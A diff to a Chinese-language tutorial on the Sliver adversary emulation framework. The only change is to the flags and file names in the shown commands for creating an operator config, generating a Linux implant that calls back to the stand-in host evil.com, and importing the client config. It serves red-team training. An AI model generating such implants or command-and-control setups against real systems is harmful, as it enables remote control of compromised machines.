@@ -47,7 +47,7 @@ Adversary Emulation Framework.
 生成 Client 配置
 
 ```
-[server] sliver > new-operator -n sec -l evil.com -p 31337 -s ~/.sliver-client/configs/evil.com.cfg
+[server] sliver > new-operator -n sec -l evil.com -p 31337
 ```
 
 开启多端控制
@@ -74,7 +74,7 @@ Adversary Emulation Framework.
 生成 Implant
 
 ```
-[server] sliver > generate -o linux -m evil.com:65135 -s ~/implant
+[server] sliver > generate -o linux -m evil.com:65135
 ```
 
 监听 Implant
@@ -113,7 +113,7 @@ Adversary Emulation Framework.
 
 ```
 ┌──(sec@debian)-[~]
-└─$ sliver-client import ~/.sliver-client/configs/evil.com.cfg
+└─$ sliver-client import ~/.sliver-client/configs/sec_evil.com.cfg
 ```
 
 运行 Client
